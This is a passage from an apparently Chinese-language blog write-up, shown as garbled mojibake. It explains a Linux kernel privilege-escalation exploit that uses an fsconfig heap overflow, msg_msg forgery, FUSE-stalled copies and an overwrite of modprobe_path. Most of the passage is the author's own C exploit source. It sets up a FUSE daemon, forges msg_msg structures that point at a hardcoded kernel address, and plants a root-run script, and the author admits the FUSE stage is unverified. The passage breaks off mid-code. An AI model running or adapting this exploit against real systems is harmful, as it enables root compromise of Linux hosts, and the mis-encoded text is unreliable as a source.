çš„æ›¿ä»£å“ï¼Œå¸®åŠ©æˆ‘ä»¬å®Œæˆæ¡ä»¶ç«äº‰çš„åˆ©ç”¨</p><p><img src="https://s2.loli.net/2023/01/10/9q3VSGepCnKzbuB.png" alt="image.png"></p><p>ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äº slub allocator çš„éšæœºæ€§ï¼Œ<strong>æˆ‘ä»¬å¹¶ä¸èƒ½ä¿è¯ä¸€å®šèƒ½å¤Ÿæº¢å‡ºåˆ°é™·å…¥ FUSE ä¸­çš„ msg_msg ï¼Œ</strong>å› æ­¤éœ€è¦å¤šæ¬¡åˆ†é…å¹¶è¿›è¡Œæ£€æŸ¥ä»¥ç¡®ä¿æˆ‘ä»¬å®Œæˆäº†ä»»æ„åœ°å€å†™</p><p>æœ‰äº†ä»»æ„åœ°å€å†™ï¼Œç°åœ¨è¯¥è€ƒè™‘å†™å“ªé‡Œã€å†™ä»€ä¹ˆäº†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¦†å†™ä¸€äº›å…¨å±€å‡½æ•°è¡¨æ¥åŠ«æŒå†…æ ¸æ‰§è¡Œæµï¼Œæˆ–æ˜¯è¦†å†™ä¸€äº›å…¶ä»–çš„ä¸œè¥¿å®Œæˆææƒï¼Œè¿™é‡Œç¬”è€…é€‰æ‹©è¦†å†™ <code>modprobe_path</code> å®Œæˆææƒï¼Œå½“æˆ‘ä»¬æ‰§è¡Œä¸€ä¸ªæ ¼å¼éæ³•çš„ç¨‹åºæ—¶ï¼Œå†…æ ¸ä¼šä»¥ root æƒé™æ‰§è¡Œ <code>modprobe_path</code> æ‰€æŒ‡çš„åº”ç”¨ï¼Œæˆ‘ä»¬åªéœ€è¦å°†å…¶æ”¹ä¸ºæˆ‘ä»¬çš„æ¶æ„è„šæœ¬çš„è·¯å¾„å³å¯</p><h3 id="FINAL-EXPLOIT-1"><a href="#FINAL-EXPLOIT-1" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>æœ€åç”±ç¬”è€…ç¼–å†™çš„ exp å¦‚ä¸‹ï¼Œå› ä¸ºä¸€äº›åŸå› æš‚æ—¶æ— æ³•è¿›è¡ŒéªŒè¯ï¼Œä½†æ˜¯æ€è·¯åº”è¯¥æ˜¯å¯¹çš„ï¼Œåœ¨ç†è®ºä¸Šåº”å½“å¯è¡Œï¼š</p><blockquote><p>å†…æ ¸åœ°å€æ³„éœ²çš„éƒ¨åˆ†ç»è¿‡éªŒè¯äº†ï¼Œä½†æ˜¯å¯¹äº FUSE è¿›è¡Œåˆ©ç”¨çš„éƒ¨åˆ†ï¼Œç”±äºç¬”è€…åœ¨å¤ç°æ¼æ´æ—¶ä½¿ç”¨çš„æ˜¯ CTF ä¸­ kernel pwn çš„ç®€æ˜“ç¯å¢ƒï¼Œæ•…æ²¡æ³•ä½¿ç”¨ FUSEï¼š(</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FUSE_USE_VERSION 34</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fuse.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_SIZE 4096</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_SIZE 32</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TYPE <span class="hljs-string">&#x27;A&#x27;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_TYPE    <span class="hljs-string">&#x27;A&#x27;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_TYPE  <span class="hljs-string">&#x27;B&#x27;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VICTIM_MSG_TYPE     0x1337</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TAG     0xAAAAAAAA</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_QUEUE_NUM 0x10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SEQ_FILE_NUM 0x100</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_HOLE_SPACE 8</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EVIL_FILE_NAME <span class="hljs-string">&quot;a3fuse_evil_file&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EVIL_DAEMON_NAME <span class="hljs-string">&quot;evil_fuse&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EVIL_MOUNT_PATH <span class="hljs-string">&quot;/tmp/evil&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EVIL_FILE_PATH EVIL_MOUNT_PATH <span class="hljs-string">&quot;/&quot;</span> EVIL_FILE_NAME</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    prev;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br>    <span class="hljs-type">uint64_t</span>    m_type;<br>    <span class="hljs-type">uint64_t</span>    m_ts;<br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    security;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) <br>               + SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msgseg)];<br>&#125; primary_msg;<br><br><span class="hljs-type">char</span> *evil_args[] = &#123; EVIL_DAEMON_NAME, EVIL_MOUNT_PATH, <span class="hljs-literal">NULL</span> &#125;;<br><span class="hljs-type">int</span> exp_fs_fd;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_readdir</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-type">void</span>* buf, </span><br><span class="hljs-params">                               <span class="hljs-type">fuse_fill_dir_t</span> filler, <span class="hljs-type">off_t</span> offset, </span><br><span class="hljs-params">                               <span class="hljs-keyword">struct</span> fuse_file_info* fi, </span><br><span class="hljs-params">                               <span class="hljs-keyword">enum</span> fuse_readdir_flags flags)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_getattr</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-keyword">struct</span> stat *stbuf, </span><br><span class="hljs-params">                               <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_read</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                            <span class="hljs-type">off_t</span> offset, <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_write</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                             <span class="hljs-type">off_t</span> offset, <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span>;<br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fuse_operations</span> <span class="hljs-title">a3fuse_evil_ops</span> =</span> &#123;<br>    .readdir = a3fuse_evil_readdir,<br>    .getattr = a3fuse_evil_getattr,<br>    .read = a3fuse_evil_read,<br>    .write = a3fuse_evil_write,<br>&#125;;<br><br><span class="hljs-type">char</span> cat_flag[] = <span class="hljs-string">&quot;#!/bin/sh\nchmod 777 /flag&quot;</span>;<br><br><span class="hljs-type">size_t</span> kernel_base = <span class="hljs-number">0xffffffff81000000</span>, kernel_offset = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\n\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, </span><br><span class="hljs-params">             <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">readMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">writeMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    *(<span class="hljs-type">long</span>*)msgp = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">peekMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> __msgsz = msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>);<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, __msgsz, msgtyp, <br>                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">buildMsg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> msg_msg *msg, <span class="hljs-type">uint64_t</span> m_list_next, <span class="hljs-type">uint64_t</span> m_list_prev, </span><br><span class="hljs-params">              <span class="hljs-type">uint64_t</span> m_type, <span class="hljs-type">uint64_t</span> m_ts,  <span class="hljs-type">uint64_t</span> next, <span class="hljs-type">uint64_t</span> security)</span><br>&#123;<br>    msg-&gt;m_list.next = m_list_next;<br>    msg-&gt;m_list.prev = m_list_prev;<br>    msg-&gt;m_type = m_type;<br>    msg-&gt;m_ts = m_ts;<br>    msg-&gt;next = next;<br>    msg-&gt;security = security;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_readdir</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-type">void</span>* buf, </span><br><span class="hljs-params">                               <span class="hljs-type">fuse_fill_dir_t</span> filler, <span class="hljs-type">off_t</span> offset, </span><br><span class="hljs-params">                               <span class="hljs-keyword">struct</span> fuse_file_info* fi, </span><br><span class="hljs-params">                               <span class="hljs-keyword">enum</span> fuse_readdir_flags flags)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(path, <span class="hljs-string">&quot;/&quot;</span>)) &#123;<br>        <span class="hljs-keyword">return</span> -ENOENT;<br>    &#125;<br><br>    filler(buf, <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    filler(buf, <span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    filler(buf, EVIL_FILE_PATH, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_getattr</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-keyword">struct</span> stat *stbuf, </span><br><span class="hljs-params">                               <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(path, <span class="hljs-string">&quot;/&quot;</span>)) &#123;<br>        stbuf-&gt;st_mode = <span class="hljs-number">0755</span> | S_IFDIR;<br>        stbuf-&gt;st_nlink = <span class="hljs-number">2</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(path + <span class="hljs-number">1</span>, EVIL_FILE_PATH)) &#123;<br>        stbuf-&gt;st_mode = <span class="hljs-number">0644</span> | S_IFREG;<br>        stbuf-&gt;st_nlink = <span class="hljs-number">1</span>;<br>        stbuf-&gt;st_size = <span class="hljs-number">0x1000</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> -ENOENT;<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_read</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                            <span class="hljs-type">off_t</span> offset, <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span><br>&#123;<br>    <span class="hljs-comment">/* I only set one page there */</span><br>    <span class="hljs-type">char</span> evil_buf[<span class="hljs-number">0x1000</span>], fake_msg[<span class="hljs-number">0x100</span>];<br>    <br>    <span class="hljs-keyword">if</span> (offset &gt;= <span class="hljs-number">0x1000</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (offset + size &gt; <span class="hljs-number">0x1000</span>) &#123;<br>        size = <span class="hljs-number">0x1000</span> - offset;<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(evil_buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(evil_buf));<br>    <span class="hljs-built_in">strcpy</span>(evil_buf, <span class="hljs-string">&quot;arttnba3/tmp/evil.sh&quot;</span>);<br>    <span class="hljs-built_in">memcpy</span>(buf, evil_buf + offset, size);<br><br>    <span class="hljs-comment">/* fake msg_msg with `next` pointing to modprobe_path*/</span><br>    buildMsg(fake_msg, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>, <br>             *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">0xffffffff82891160</span> + kernel_offset, <br>             *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>);<br>    fsconfig(exp_fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;&quot;</span>, fake_msg + <span 